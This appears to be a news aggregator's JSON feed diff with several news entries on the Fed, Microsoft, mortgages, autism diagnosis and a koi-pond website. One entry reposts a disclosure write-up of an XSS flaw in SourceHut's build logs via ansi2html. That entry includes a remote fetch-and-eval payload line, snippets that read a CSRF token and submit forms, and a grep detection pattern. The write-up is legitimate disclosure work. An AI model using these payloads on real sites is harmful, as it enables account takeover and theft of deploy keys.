Kevin Warsh has emphasized letting markets help guide policy. That's a big reversal from central bank policy since the global financial crisis in 2008, when the Fed used its forward-guidance tool to signal to investors which way rates were headed.\n\n\"His framework appears significantly less rooted in economic measurement details and significantly more reflective of market narratives,\" UBS economist Jonathan Pingle wrote of Warsh. \"No Chairman of the Board of Governors of the Federal Reserve has emphasized considering the signals from financial markets as an input into monetary policy decisions as strongly as Chairman Warsh.\"\n\nWith a yield surge that has taken the 30-year bond to its highest level since 2004, market dynamics have swung Warsh from someone calling for cuts prior to taking the job in May, to a chair who seems to have forged a hawkish coalition on the FOMC.\n\nIn fact, Pingle speculated that Warsh, following last week's post-meeting news conference, \"left little doubt to us that his views more closely align\" with Cleveland Fed President Beth Hammack, arguably one of the most hawkish of this year's voting group, \"than anyone else on the FOMC.\"\n\nFor now, at least, markets are going with the interpretation that Warsh will let the Treasury market guide him toward progressively higher benchmark rates.\n\n\"There's a good reason why central bankers are beginning to be concerned about overheating in the investment section of the economy,\" said Brusuelas, the RSM economist. \"Mr. Market is signaling something to policymakers like Kevin Warsh that they ought to listen to.\"\n\nGot a confidential news tip? We want to hear from you.\n\nGet this delivered to your inbox, and more info about our products and services.\n\nData is a real-time snapshot *Data is delayed at least 15 minutes. Global Business and Financial News, Stock Quotes, and Market Data and Analysis.\n\nData also provided by",
+        "fullTranslation": "【官方正文已获取，中文全文翻译尚未完成；暂不展示外文正文。】",
+        "contentStatus": "full",
+        "translationStatus": "source-only",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 31,
+        "translationParagraphs": 0,
+        "keyTakeaways": [],
+        "citations": [
+          {
+            "source": "CNBC Economy (CNBC 宏观经济)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T21:40:19.000Z",
+            "url": "https://www.cnbc.com/2026/09/24/surging-treasury-yields-are-posing-a-brand-new-problem-for-kevin-warsh-and-the-fed.html"
+          }
+        ]
+      },
+      {
+        "id": "story-ts-srht-account-takeover-cb5ed105214e004b",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "SourceHut account takeover via build logs (XSS in ansi2html.py)",
+        "source": "Lobste.rs (极客思想社区)",
+        "sourceSlug": "lobsters",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T20:38:32.000Z",
+        "pubTime": "2026-09-25 04:38",
+        "url": "https://blog.arusekk.pl/posts/srht-account-takeover/",
+        "imageUrl": null,
+        "fullContent": "Welcome to my first big impact vulnerability writeup!\n\nI like good stories, so let me describe some background first. I recently had a ‘great’ idea (I know, I know, I should stop having these) to set up a sr.ht instance that would pay people for hosting their projects. You can find it shamelessly plugged in the timeline section, in case you want to try it or flame me for it on socials.\n\nAnyway, the story. The first step was to clone some minimal subset of the sr.ht repos, and start hacking on it.\n\nI tend to include the following statement in my vulnerability research submissions from this year. Make from it what you wish.\n\nNo NLP has been used in this research. The mistakes are all mine.\n\nSourceHut is structured in several microservices, the main ones being meta.sr.ht and probably git.sr.ht or hub.sr.ht (the flagship instance hosts it at just sr.ht). And of course builds.sr.ht, the CI.\n\nOne less known is mirror.sr.ht (slowly moving to mirror.srht.network), containing prebuilt packages for various microservices.\n\nI must say I like this approach, because it allows a very easy start on any machine matching the flagship instance distro version exactly.\n\nIf your favourite project currently recommends installation via curl|sudo bash or ‘just launch Claude in this folder’ (sic!), please consider making yourself aware of the not less valid option of distributing software to end users using actual software packages instead.1\n\nSo if you happen to use a different distro, or even a different version of Alpine, you are on your own a bit. So there is the sr.ht-apkbuilds repo, and you can ‘fork’ it to use your signing key, your Alpine version and your mirror. There is also sr.ht-pkgbuilds for Arch, but it’s effectively unmaintained at this point.2\n\nThis involves using builds.sr.ht to bootstrap the packages. I tried to look at the page source of the build log, because it kept scrolling not where I wanted, which annoyed me a bit.\n\nThat’s when I found this:\n\nI decided to take a closer look how it’s done, and maybe fix it. Look, I like SourceHut. I can see there is quite some wasted compute and bandwidth here. I want them to get rich so that others follow suit, and there is some unnecessary waste slowing that.3\n\nI took a look into the logic converting ANSI escape codes to HTML, and I filed an issue for it. There has been no activity in the repo for over a year at that point, so I decided to work on it, because I like receiving good patches myself, when I am not focused on a particular project. This quickly resulted in submitting a PR fixing this particular issue.\n\nGiven my Capture The Flag background, I started looking into ansi2html a bit more, in hunt for more bugs (especially that I’m about to host it myself!). Apart from parsing escape sequences for colors, it also allows for automatic links, and OSC 8 hyperlinks. Because the code is not so well-structured yet, I was able to craft a malicious input string after reading this great XSS cheatsheet (now forever in my bookmarks):\n\nThe former is worth some explanation. No idea why, but as you can check, it parses to the same DOM tree as:\n\nSo if you happen to be able to make ␛]8;;https://example.com/\"/...␇ appear in the job logs —4 which you can, either without even having an account, by sending a patch to a public mailing list with continuous integration turned on, or by controlling any remote resource that happens to be printed to the log — congratulations, you have just created a build job at https://builds.sr.ht/~someone-else/job/1234567 that executes your payload in every browser that views it. You can submit the job yourself, but this requires a paid account on the flagship instance. And there are no anonymous payments currently there.\n\nThe actual payload can be downloaded from an attacker’s website, like eval(await (await fetch('https://example.com')).text()) but here’s some speculation about what it could do.\n\nThe build log page already contains the CSRF token. You can read it with document.querySelector('[name=_csrf_token]').value for example, or just use the existing form (part of the ‘Resubmit build’ button), like document.querySelector('[name=manifest]').value=`something`;document.forms[0].submit(). Once you get an admin to view it, you can probably grant yourself admin rights. The worse impact is that you have access to all the deploy keys, and on builds.sr.ht, there are deploy keys for sr.ht itself (probably not the case with other instances).\n\nMaking this part of the payload is left as an exercise for the curious reader. I cannot stress this enough: remember to only test worms on your own infrastructure. And never on production. Even if it’s your production.\n\nBy restricting Content-Security-Policy. I’m no expert here, but removing ‘unsafe-inline’ would be a good first step (not useful advice in itself, because inline scripts are currently used even on the build log page itself, for scrolling).\n\nBy extra sanitization (SourceHut added it, but it’s overzealous - now there are no colors!).\n\nAnd by restructuring the code in ansi2html into some stateful transducer automaton thing.\n\nI immediately emailed ~sircmpwn/sr.ht-security@lists.sr.ht explaining the entire problem, complete with a fix that mitigated the worst part at least.\n\nDrew (can I call you Drew? I guess we are all brothers in Source) ended up patching builds.sr.ht to auto-sanitize the output from ansi2html instead. Also a good choice.\n\nThen I contacted upstream (maybe a bit too late? exact timeline below). Ansi2html is one of the projects featured in the famous and by now beaten to death comic strip by Randall Munroe.5 Placed under pycontribs org on GitHub, which ominously states:\n\nPyContribs main purpose is to assure that different Python-related projects remain maintained.\n\nI reached out to the two top people from last 5 or so years’ worth of contributor graph, emails from git history, in order not to make the issue public yet, although it was already made public by the SourceHut announcement.\n\nThe maintainer I believed to be the ‘main’ one (Sorin Sbarnea) has not replied to date (he might be having some kind of holiday), although the other one (Sebastian Pipping) has. And the message was a cryptic, unusual for me to receive, ‘mail me in two weeks’.\n\nSo I patiently waited two weeks, minding my another nascent business (let me try, okay?), and sent the email.\n\nIt turned out that Sebastian (can I call you Sebastian?) is a cool guy and he figured he needed me to help him because of something with ACLs on the repo. We ended up getting ansi2html up from the suspension it was in, updating some obsolete scripts, and releasing like 3 or 4 versions of ansi2html to PyPI together.\n\nI tried to be helpful, but had some things going on with my PhD-in-spe, so some latency crept in.\n\nLet’s start with the hot take that CVSS scoring is a fallacy: it should be separate for each product and not just one for one root cause code path.\n\nThe purpose of CVSS is after all to provide useful information to downstream users on whether to go patch it or not. Researchers have the incentive to make it as high as possible. And projects have the incentive to downplay it. They do want to fix it, but they want to avoid the paperwork involved, and the confidentiality dance of passing it all around (and I totally get it!).\n\nThe problem is, not all software is born equal, and this is especially the case with libraries like libcurl.\n\nCVSS 4.0 is at least a bit better than CVSS 3.x. It now makes a distinction on Vulnerable System and Subsequent System. In case of XSS vulnerabilities the typical approach is to say that the web service is Vulnerable, and the browser is Subsequent (which kind of makes sense, because the bug is in the service, but then it impacts the victim browser first in order to attack the web service itself again).\n\nThe vector I initially came up with has been altered by VulnCheck. Not sure why, but maybe it can be changed back? Or maybe not worth bothering. Let me know what you think. I also want to add this blog post to the CVE DB, but I might need to check how to do it.\n\nvulnerable system (builds.sr.ht / all of sr.ht)\n\nsubsequent system (victim browser)\n\nWhile the exact impact can and should be disputed by actual users (after all, SourceHut boasts working just fine without javascript), I would argue for high or critical, not just a mere medium, because if I were a blackhat, it would suffice that Drew visited an affected build log with JS turned on, and I could submit a build job in his name with access to SourceHut deploy keys. Not sure how I would turn that into money or get away with it though. Don’t do this, kids. No excitement justifies it.\n\nansi2html >=1.7.0, <1.9.4, builds.sr.ht >= 0.40.0, < 0.105.1\n\nCheck your raw build logs for ␛]8;;https://example.com/\"/...␇ or ␛]8;;javascript:...␇. In Bash, that would probably be something along grep $'\\33]8;[^\\7\\33]*\"' for the former.\n\nI’m not so proud of this timeline, but hey, at least everything is fixed now and there are no (?) records of people trying to use it. I will include the official Arch Linux repo and the sr.ht Alpine Linux repo, because both systems were recommended at one point.\n\nNote how even carefully auditing ansi2html would not save SourceHut, unless redone on every bump. builds.sr.ht remained vulnerable for (almost exactly) 4,5 years.\n\nGod for keeping the blackhat temptations away. Danonek123 for keeping me company. I love you.\n\nSee, vulnerability research does not need to be a circus, or security theatre, or a lawyered-up fight against bureaucracy. But then you might not end up better off.\n\nExcluding CTFs & invitations to minor conferences (and being allowed to do some VR as part of my internship back when at Antmicro, which I am still grateful for), I have made a metric 0.00€ (that’s $0.00 Fahrenheit) from my vulnerability research so far. If you want to support me (so that I have more time for VR), consider buying something. I like it better than donations (though they are fine too!). I’m also available for professional security consulting.\n\nOr at least provide some optional ultra-simple configure script that allows to just run make install/ninja install so that other people can package it easily. (By the way, I still can’t get it why people use AppImage instead of just a static binary.) ↩︎\n\nYou can still probably send your patches if you want to host your sr.ht on Arch! ↩︎\n\nHey Drew/Conrad/Simon/(sorry if I missed someone!), when you update ansi2html in sr.ht-apkbuilds, actually when you first restart builds.sr.ht after that, please measure the bandwidth impact on builds.sr.ht. I will make sure to link it here. ↩︎\n\nYes, that’s an em dash. I use Polish typography here, because I have no editor to answer to. Feel free to correct me, though. You can be my drive-by editor. ↩︎\n\nOops, sorry, wrong link. I’m talking about https://xkcd.com/2347/ of course. ↩︎\n\nTotally not an impulse buy. ‘To get a sense of being invested.’ I tell to myself. ↩︎",
+        "fullTranslation": "【官方正文已获取，中文全文翻译尚未完成；暂不展示外文正文。】",
+        "contentStatus": "full",
+        "translationStatus": "source-only",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 53,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "来源叙事重点：文章聚焦 SourceHut 的 builds.sr.ht 使用 ansi2html 处理构建日志时存在的跨站脚本（XSS）风险。作者描述了漏洞发现、向 SourceHut 报告、修复以及推动上游 ansi2html 恢复维护和发布新版本的过程，并进一步主张该漏洞潜在影响可能高于通常的中等级别。文中还穿插作者对软件分发、开源维护、CVE/CVSS 评分和漏洞披露流程的个人评论。"
+        ],
+        "citations": [
+          {
+            "source": "Lobste.rs (极客思想社区)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T20:38:32.000Z",
+            "url": "https://blog.arusekk.pl/posts/srht-account-takeover/"
+          }
+        ]
+      }
+    ],
+    "articleSnapshots": [
+      {
+        "id": "story-25-igrok-2120141468-html-3ee7aa9e0b6ae465",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "Футболист сборной Косова показал провокационный логотип после гола",
+        "source": "RIA Novosti (俄新社官方俄文)",
+        "sourceSlug": "ria",
+        "sourceLang": "ru",
+        "publishedAt": "2026-09-24T22:29:21.000Z",
+        "pubTime": "2026-09-25 06:29",
+        "url": "https://ria.ru/20260925/igrok-2120141468.html",
+        "imageUrl": null,
+        "fullContent": "",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "missing",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 0,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【RIA Novosti (俄新社官方俄文)】于 2026-09-25 06:29 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "RIA Novosti (俄新社官方俄文)",
+            "url": "https://ria.ru/20260925/igrok-2120141468.html",
+            "publishedAt": "2026-09-24T22:29:21.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story-comms-pr-brad-smith-cela-99ff6e3fec1ed6bf",
+        "title": "微软任命布拉德·史密斯掌管传播业务",
+        "originalTitle": "Microsoft puts Brad Smith in charge of communications",
+        "source": "The Verge (前沿数码科技)",
+        "sourceSlug": "theverge",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T22:08:22.000Z",
+        "pubTime": "2026-09-25 06:08",
+        "url": "https://www.theverge.com/news/1000374/microsoft-comms-pr-brad-smith-cela",
+        "imageUrl": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/09/gettyimages-2268973139.jpg?quality=90&#038;strip=all&#038;crop=0,0,100,100",
+        "fullContent": "Posts from this topic will be added to your daily email digest and your homepage feed.\n\nMicrosoft’s communications are moving over to the legal and corporate side of the house.\n\nPosts from this author will be added to your daily email digest and your homepage feed.\n\nSee All by Tom Warren\n\nMicrosoft is moving its communications group out of marketing and into its Corporate, External, and Legal Affairs (CELA) organization. The surprise change will see Microsoft vice chair and president Brad Smith oversee communications, while the company searches for a replacement for Frank Shaw, chief communications officer, who is departing later this year.\n\nMicrosoft CEO Satya Nadella thanked Shaw “for everything he has done for Microsoft” in an internal memo announcing the communications changes. Shaw announced earlier this month that he’s leaving Microsoft after nearly three decades supporting the company’s communications.\n\nBrent Colburn, VP of global public affairs, has been appointed as interim communications leader to help navigate what Nadella calls “a media environment that is increasingly fragmented and noisier than ever.” Nadella also says he’s “excited about the opportunity to help our engineers, sellers, partners, and others closest to our products and customers become an even bigger part of how we tell our story.”\n\nAs GeekWire points out, that sounds a lot like how AI startups work, with researchers leading the demos and blogs at companies like OpenAI and Anthropic. Microsoft has been chasing Google, Anthropic, and OpenAI to “become one of the top four labs in the world,” according to Microsoft AI CEO Mustafa Suleyman. In an interview with The Verge earlier this year, Suleyman said he wants Microsoft “to build the very best frontier models in the world.”\n\nBrad Smith, who’s taking over communications from chief marketing officer Takeshi Numoto, is often the public face of Microsoft’s policy and corporate communications. Smith travels the world meeting with governments, regulators, and Microsoft’s customers. It’s still not clear who will take over permanently from Shaw later this year, but Microsoft is looking at both internal and external candidates.\n\nHere’s Satya Nadella’s memo:\n\nCommunications has never been more important to Microsoft. The company is changing, our industry is changing, and the world around us is changing. And in a media environment that is increasingly fragmented and noisier than ever, we need to continue to be grounded in our mission, earn trust each day, and find new ways to connect directly with all of our constituencies.\n\nI first want to thank Frank for everything he has done for Microsoft. He has made tremendous contributions to the company and to our communications function over the last 17+ years. And he’s been a great source of counsel to our leadership team and to me personally, across the company’s biggest moments.\n\nAs Frank prepares to embark on his next chapter, Takeshi, Brad, and I have been discussing the evolution of comms at the company. I have asked Brad to lead the communications function going forward. Few leaders embody Microsoft’s voice as authentically as Brad. He brings a deep understanding of our business, a strong connection to our stakeholders, and a rare ability to communicate complex ideas with clarity, conviction, and trust.\n\nDuring this transition, Brent Colburn will continue reporting to Brad and will now act as our interim communications leader. The comms leadership team will report to Brent, and Frank will continue to advise Brad and Brent on the transition.\n\nIn many ways, the people closest to the work have the best opportunity to shape how Microsoft is understood. We need to give people across the company the tools and support to do it well. And I’m excited about the opportunity to help our engineers, sellers, partners, and others closest to our products and customers become an even bigger part of how we tell our story, all connected by a shared strategy and set of principles. All of you have a critical role to play in making that possible.\n\nWe have an exciting fall ahead, with a number of important moments and events coming up and great marketing behind them. It is a real opportunity to bring together our product story, our marketing, and our communications in new ways.\n\nWe will learn, we will experiment, and we will evolve. There is a fundamentally new way to think about communications, and this team will be central to building it.\n\nThank you for everything you do for Microsoft, and for the role you each play in telling our story.\n\nA free daily digest of the news that matters most.\n\nThis is the title for the native ad",
+        "fullTranslation": "该主题的推送将添加到您的每日邮件摘要和主页动态中。\n微软的传播业务正转至法律与公司事务部门。\n该作者的推送将添加到您的每日邮件摘要和主页动态中。\n查看汤姆·沃伦（Tom Warren）的全部文章\n\n微软正将其传播团队从营销部门剥离，并入公司法务与外部事务（CELA）部门。这一令人意外的变动将使微软副董事长兼总裁布拉德·史密斯（Brad Smith）负责监督传播业务，与此同时，公司正在寻找首席传播官弗兰克·肖（Frank Shaw）的接替人选，后者将于今年晚些时候离职。\n\n微软首席执行官萨提亚·纳德拉（Satya Nadella）在宣布传播架构调整的内部备忘录中，对弗兰克·肖“为微软所做的一切”表示感谢。肖本月早些时候宣布，在为公司的传播业务服务近三十年后，他将离开微软。\n\n全球公共事务副总裁布伦特·科尔伯恩（Brent Colburn）已被任命为临时传播主管，以协助应对纳德拉所称的“日益碎片化且比以往任何时候都更加嘈杂的媒体环境”。纳德拉还表示，他“对有机会帮助我们的工程师、销售人员、合作伙伴以及其他最贴近我们产品与客户的人员，在讲述我们的故事方面发挥更大作用而感到振奋”。\n\n正如科技媒体GeekWire指出的那样，这听起来非常像人工智能初创公司的运作方式，在OpenAI和Anthropic等公司中，演示和博客通常由研究人员主导。据微软AI首席执行官穆斯塔法·苏莱曼（Mustafa Suleyman）称，微软一直在追赶谷歌、Anthropic和OpenAI，“以成为全球四大顶级实验室之一”。在今年早些时候接受The Verge采访时，苏莱曼曾表示，他希望微软“打造出全球最顶尖的前沿模型”。\n\n从首席营销官沼本健（Takeshi Numoto）手中接管传播业务的布拉德·史密斯，通常是微软政策与公司公关的公开代言人。史密斯奔赴全球各地，与政府、监管机构和微软客户会面。目前尚不清楚谁将在今年晚些时候正式接替肖的职位，但微软正在物色内部和外部候选人。\n\n以下是萨提亚·纳德拉的备忘录全文：\n\n传播业务对微软而言从未像现在这样重要。公司在变，我们的行业在变，我们周围的世界也在变。在日益碎片化且比以往任何时候都更加嘈杂的媒体环境中，我们需要继续立足于我们的使命，日积月累赢得信任，并寻找新方式与所有利益相关群体直接建立连接。\n\n我首先要感谢弗兰克为微软所做的一切。在过去的17年多时间里，他为公司以及我们的传播职能做出了巨大贡献。在公司最重要的关头，他一直是领导团队以及我个人的重要智囊。\n\n在弗兰克准备开启人生下一篇章之际，沼本健、布拉德和我一直在讨论公司传播职能的演变。我已要求布拉德自即日起领导传播职能。很少有领导者能像布拉德那样真实地代表微软的声音。他对我们的业务有着深刻的理解，与利益相关者保持着紧密的联系，并且拥有难能可贵的能力，能够以清晰、坚定和令人信服的方式传达复杂的理念。\n\n在此过渡期间，布伦特·科尔伯恩将继续向布拉德汇报，并出任我们的临时传播主管。传播领导团队将向布伦特汇报，弗兰克将继续就过渡事宜为布拉德和布伦特提供建议。\n\n在许多方面，最贴近具体工作的人最有机会塑造外界对微软的认知。我们需要为全公司的人员提供工具和支持，帮助他们把这件事做好。我非常振奋能有机会帮助我们的工程师、销售人员、合作伙伴以及其他最贴近产品和客户的人员，在统一战略和原则指引下，在讲述微软故事的过程中发挥更大作用。你们每个人在实现这一目标的过程中都扮演着至关重要的角色。\n\n接下来我们将迎来一个激动人心的秋季，不仅有诸多重要时刻和活动，背后还有强大的营销支持。这是一个真正契机，可以以全新的方式将我们的产品故事、营销和传播融合在一起。\n\n我们将学习、尝试并不断演进。我们需要从根本上重新审视传播方式，而这个团队将在构建这种新模式中发挥核心作用。\n\n感谢你们为微软所做的一切，也感谢你们在讲述我们故事中各自扮演的角色。\n\n每日免费获取最重要的新闻摘要。\n这是原生广告的标题",
+        "contentStatus": "full",
+        "translationStatus": "full",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 20,
+        "translationParagraphs": 16,
+        "keyTakeaways": [
+          "来源叙事重点：聚焦微软将通信部门从营销体系转入企业、外部事务与法律事务（CELA）体系，以及布拉德·史密斯暂时负责通信、弗兰克·肖即将离任的组织调整。报道同时将纳德拉所称的“媒体环境日益碎片化和嘈杂”、让工程师和产品相关人员更多参与叙事，与OpenAI、Anthropic等人工智能公司的传播方式联系起来，暗示微软正在探索更直接、更由产品和技术人员参与的企业传播模式。文中关于“意外变化”、与AI初创公司相似等表述属于报道框架或分析，不等同于微软已明确宣布的战略结论。"
+        ],
+        "citations": [
+          {
+            "source": "The Verge (前沿数码科技)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T22:08:22.000Z",
+            "url": "https://www.theverge.com/news/1000374/microsoft-comms-pr-brad-smith-cela"
+          }
+        ]
+      },
+      {
+        "id": "story-xed-rate-surges-aa202464-f3b93b5f1ae9f2d2",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "8% mortgage rates are ‘not an impossibility’ as the 30-year fixed rate surges",
+        "source": "MarketWatch Top Stories (市场观察)",
+        "sourceSlug": "marketwatch",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T22:03:00.000Z",
+        "pubTime": "2026-09-25 06:03",
+        "url": "https://www.marketwatch.com/story/8-mortgage-rates-are-not-an-impossibility-as-the-30-year-fixed-rate-surges-aa202464?mod=mw_rss_topstories",
+        "imageUrl": null,
+        "fullContent": "With the 10-year Treasury up sharply and the outlook for the U.S. economy looking unclear, some say 8% mortgage rates are back on the table.",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "short-source",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 1,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【MarketWatch Top Stories (市场观察)】于 2026-09-25 06:03 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "MarketWatch Top Stories (市场观察)",
+            "url": "https://www.marketwatch.com/story/8-mortgage-rates-are-not-an-impossibility-as-the-30-year-fixed-rate-surges-aa202464?mod=mw_rss_topstories",
+            "publishedAt": "2026-09-24T22:03:00.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story-ars-for-autism-diagnosis-a865f7788037e062",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "‘Her mental health deteriorated’: family forced to wait years for autism diagnosis",
+        "source": "The Guardian Society (卫报社会与民生)",
+        "sourceSlug": "guardian",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T21:08:52.000Z",
+        "pubTime": "2026-09-25 05:08",
+        "url": "https://www.theguardian.com/society/2026/sep/24/her-mental-health-deteriorated-family-forced-to-wait-years-for-autism-diagnosis",
+        "imageUrl": "https://i.guim.co.uk/img/media/fd5bd10a43cee025a44ab3f576aed72b500058a0/213_0_3781_3024/master/3781.jpg?width=140&quality=85&auto=format&fit=max&s=8bd72041ca1f99999b83a7657d31bce9",
+        "fullContent": "A mother describes the frustration of endless waiting lists and difficulties getting appointments so her teenage daughter can get the help she requires\n\nFor Rosalyn, the battle for an official autism diagnosis for her 14-year-old daughter, Imogen, has been intense, deeply frustrating and has lasted five and a half years.\n\nThat Rosalyn has three other children who have autism diagnoses meant she was acutely aware of the signs.",
+        "fullTranslation": "【官方正文已获取，中文全文翻译尚未完成；暂不展示外文正文。】",
+        "contentStatus": "full",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-body",
+        "contentParagraphs": 3,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "Rosalyn 为其 14 岁的女儿 Imogen 争取自闭症官方诊断的过程持续了五年半。",
+          "Rosalyn 的另外三个孩子也确诊了自闭症。",
+          "来源叙事重点：以Rosalyn为女儿Imogen争取自闭症正式诊断的长期经历为核心，突出等待名单漫长、预约困难以及由此产生的挫败感，并将家庭已有三名自闭症确诊子女这一背景作为母亲识别相关迹象和持续寻求诊断的依据。标题提到女儿心理健康恶化，但现有正文片段未提供具体事实细节。"
+        ],
+        "citations": [
+          {
+            "source": "The Guardian Society (卫报社会与民生)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T21:08:52.000Z",
+            "url": "https://www.theguardian.com/society/2026/sep/24/her-mental-health-deteriorated-family-forced-to-wait-years-for-autism-diagnosis"
+          }
+        ]
+      },
+      {
+        "id": "story-ld-atmosphere-clues-html-6e1814561212d991",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "Coolest lava world yet with signs of an atmosphere offers clues to early Earth",
+        "source": "Phys.org (基础物理与技术前沿)",
+        "sourceSlug": "science",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T22:20:06.000Z",
+        "pubTime": "2026-09-25 06:20",
+        "url": "https://phys.org/news/2026-09-coolest-lava-world-atmosphere-clues.html",
+        "imageUrl": "https://scx1.b-cdn.net/csz/news/tmb/2026/study-led-by-uchicago.jpg",
+        "fullContent": "In the search for extraterrestrial life, it makes sense to first look for rocky planets with an atmosphere, like Earth. Without an atmosphere, a planet can't have surface water. But of the more than 6,300 exoplanets cataloged thus far, the vast majority are not rocky, and only a handful of the rocky worlds appear to have an atmosphere.",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "short-source",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 1,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【Phys.org (基础物理与技术前沿)】于 2026-09-25 06:20 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "Phys.org (基础物理与技术前沿)",
+            "url": "https://phys.org/news/2026-09-coolest-lava-world-atmosphere-clues.html",
+            "publishedAt": "2026-09-24T22:20:06.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story-5-moskva-2120141250-html-1657a6d07dd13314",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "ПВО сбила десять БПЛА, летевших на Москву",
+        "source": "RIA Novosti (俄新社官方俄文)",
+        "sourceSlug": "ria",
+        "sourceLang": "ru",
+        "publishedAt": "2026-09-24T22:23:13.000Z",
+        "pubTime": "2026-09-25 06:23",
+        "url": "https://ria.ru/20260925/moskva-2120141250.html",
+        "imageUrl": "https://cdnn21.imgria.ru/images/07ea/03/1d/2083579162_0:0:3072:1728_650x0_80_0_0_0baec50ad166e327155c0b792d83d42b.jpg",
+        "fullContent": "",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "missing",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 0,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【RIA Novosti (俄新社官方俄文)】于 2026-09-25 06:23 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "RIA Novosti (俄新社官方俄文)",
+            "url": "https://ria.ru/20260925/moskva-2120141250.html",
+            "publishedAt": "2026-09-24T22:23:13.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story-item-b7a60ac418578a94",
+        "title": "Show HN：Koi.rest —— 看会儿游鱼，找回内心的平静",
+        "originalTitle": "Show HN: Koi.rest – watch some fish and regain your balance",
+        "source": "Hacker News (科技前沿论坛)",
+        "sourceSlug": "hackernews",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T21:33:03.000Z",
+        "pubTime": "2026-09-25 05:33",
+        "url": "https://koi.rest/",
+        "imageUrl": null,
+        "fullContent": "My name is Paul. I’m a developer, an explorer and I’ve got ADHD. As of the beginning of August, I’m also unemployed. This last part, along with everything else this past year, has caused me a great deal of stress.\n\nWhile our balcony zen garden project is yet to be completed, I had an idea to create a virtual one that everyone can use. It's an idea that, unfortunately, I’ve been postponing for a while now, mostly because I have no fucking idea how to do it as I don’t know JavaScript, and I don't have the capacity to learn it right now. So I let perfect be the enemy of good and, well... just kept the idea to myself.\n\nThen I said \"fuck it\" and used AI to make the thing I really wanted to make. I realized I didn't want \"perfect\". I wanted \"good enough\". I tweaked, added, removed, drew, researched, questioned, tested... I just wasn't the one coding it. So now, instead of occupying my brain, it now lives on the internet for others to enjoy.\n\nYes, there’s something noble about making something entirely on your own, but what good is an idea that just sits in my head? So here I am. I made the thing. The weird, little, quiet koi pond. The silly project of passion. The little corner of the internet to let strangers watch fish quietly, together.\n\nI hope this pond helps you as much as it helped me.\n\nP.S. Yes, I am still looking for a job! If you think you can help, please contact me at\n\nWelcome to the pond — a quiet place to regain your balance koi you see are other people visiting the pond together with you you can stay as long as you'd like",
